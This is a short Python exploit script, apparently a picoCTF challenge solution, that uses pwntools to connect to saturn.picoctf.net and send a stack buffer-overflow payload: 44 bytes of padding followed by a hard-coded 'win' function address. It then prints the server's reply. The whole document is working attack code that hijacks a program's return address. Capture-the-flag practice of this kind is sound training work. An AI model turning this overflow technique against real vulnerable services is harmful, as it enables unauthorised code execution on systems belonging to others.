from pwn import *

host = 'saturn.picoctf.net'
port = 56983

p = remote(host, port)

win_addr = p32(0x080491f6)

payload = b'A' * 44 + win_addr

p.sendline(payload)
response = p.recvall(timeout=5)
print(f"{response.decode('utf-8')}")
